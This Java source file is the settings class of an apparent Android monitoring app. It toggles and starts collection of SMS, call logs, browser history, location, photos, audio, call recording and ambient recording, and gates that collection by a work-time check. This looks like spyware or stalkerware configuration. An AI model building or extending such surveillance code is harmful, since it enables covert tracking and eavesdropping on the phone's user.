package com.inet.android.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;

import com.inet.android.bs.ServiceControl;
import com.inet.android.request.AppConstants;

public class AppSettings {

	private static String LOG_TAG = AppSettings.class.getSimpleName().toString();

	public static int getState(int method, Context mContext) {
		if (!WorkTimeDefiner.isDoWork(mContext)) {
			Logging.doLog(LOG_TAG, "Work time return 0", "Work time return 0");
			return 0;
		}
		return getSetting(method, mContext);
	}

	public static int getSetting(int method, Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		Logging.doLog(LOG_TAG, "method" + method, "method" + method);
		int value = -1;

		switch (method) {
		case AppConstants.TYPE_INCOMING_CALL_REQUEST:
			value = Integer.parseInt(sp.getString("call", "0"));
			break;
		case AppConstants.TYPE_INCOMING_SMS_REQUEST:
			value = Integer.parseInt(sp.getString("sms", "0"));
			break;
		case AppConstants.TYPE_HISTORY_BROUSER_REQUEST:
			value = Integer.parseInt(sp.getString("www", "0"));
			break;
		case AppConstants.TYPE_LOCATION_TRACKER_REQUEST:
			value = Integer.parseInt(sp.getString("geo", "0"));
			break;
		case AppConstants.LOCATION_TRACKER_MODE:
			value = Integer.parseInt(sp.getString("geo_mode", "0"));
			break;
		case AppConstants.TYPE_DISPATCH:
			value = Integer.parseInt(sp.getString("dispatch", "0"));
			break;
		case AppConstants.TYPE_IMAGE_REQUEST:
			value = Integer.parseInt(sp.getString("image", "0"));
			break;
		case AppConstants.TYPE_AUDIO_REQUEST:
			value = Integer.parseInt(sp.getString("audio", "0"));
			break;
		case AppConstants.RECORD_CALL:
			value = Integer.parseInt(sp.getString("rec_call", "0"));
			break;
		case AppConstants.RECORD_ENVORIMENT:
			value = Integer.parseInt(sp.getString("rec_env", "0"));
			break;
		case AppConstants.RECORD_ENVORIMENT_CALL:
			value = Integer.parseInt(sp.getString("rec_env_call", "0"));
			break;
		case AppConstants.TYPE_LIST_CALL:
			value = sp.getInt("list_call", 0);
			break;
		case AppConstants.TYPE_LIST_MESSAGE:
			value = sp.getInt("list_sms", 0);
			break;
		case AppConstants.TYPE_LIST_CONTACTS:
			value = sp.getInt("list_contact", 0);
			break;
		case AppConstants.TYPE_LIST_APP:
			value = sp.getInt("list_app", 0);
			break;
		}
		if (value == -1) {
			Logging.doLog(LOG_TAG, "value = -1 return 1 ",
					"value = -1 return 1 ");

			return 1;
		}
		Logging.doLog(LOG_TAG, "return value: " + value, "return value: "
				+ value);

		return value;
	}

	public static void changeValueMethod(int method, String newValue,
			Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		Editor ed = sp.edit();

		Logging.doLog(LOG_TAG, "changeValueMethod " + method + " " + newValue,
				"changeValueMethod " + method + " " + newValue);
		switch (method) {

		
		case AppConstants.TYPE_INCOMING_SMS_REQUEST:
			if (!sp.getString("sms", "0").equals(newValue)) {
				ed.putString("sms", newValue);
				ed.commit();
				if (newValue.equals("1"))
					ServiceControl.runSMSObserver(mContext);
			}
			break;
		case AppConstants.TYPE_HISTORY_BROUSER_REQUEST:
			if (!sp.getString("www", "0").equals(newValue)) {
				ed.putString("www", newValue);
				ed.commit();
				if (newValue.equals("1"))
					ServiceControl.runLink(mContext);
				else
					ServiceControl.stopLink(mContext);
			}
			break;
		case AppConstants.TYPE_LOCATION_TRACKER_REQUEST:
			if (!sp.getString("geo", "0").equals(newValue)) {
				ed.putString("geo", newValue);
				ed.commit();
				if (!newValue.equals("0"))
					ServiceControl.runLocation(mContext);
				else
					ServiceControl.stopLocation(mContext);
			}
			break;
		case AppConstants.LOCATION_TRACKER_MODE:
			if (!sp.getString("geo_mode", "0").equals(newValue)) {
				ed.putString("geo_mode", newValue);
				ed.commit();
				ServiceControl.runLocation(mContext);
			}
			break;

		default:
			break;
		}
	}

	public static void setValueFileObserverService(String method, String value,
			Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		Editor ed = sp.edit();
		boolean setRunObserver = false;
		if (!sp.getString("audio", "0").equals(method)) {
			ed.putString("audio", value);
			ed.commit();
			if (method.equals("1"))
				setRunObserver = true;
		}
		if (!sp.getString("image", "0").equals(method)) {
			ed.putString("image", value);
			ed.commit();
			if (value.equals("1") && setRunObserver)
				ServiceControl.runFileObserver(mContext);
		}
	}

	public static String getKeyForRecord(Context mContext) {
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		return sp.getString("key_rec", "0");
	}

	private static String lastImagePath = "";
	private static String lastCreateAudioPath = "";
	private static String lastAudioPath = "";

	public static void setLastImageFile(String path) {
		lastImagePath = path;
	}

	public static String getLastImageFile() {
		return lastImagePath;
	}

	public static void setLastCreateAudioFile(String path) {
		lastCreateAudioPath = path;
	}

	public static void setLastAudioFile(String path) {
		lastAudioPath = path;
	}

	public static String getLastCreateAudioFile() {
		return lastCreateAudioPath;
	}

	public static String getLastAudioFile() {
		return lastAudioPath;
	}
}
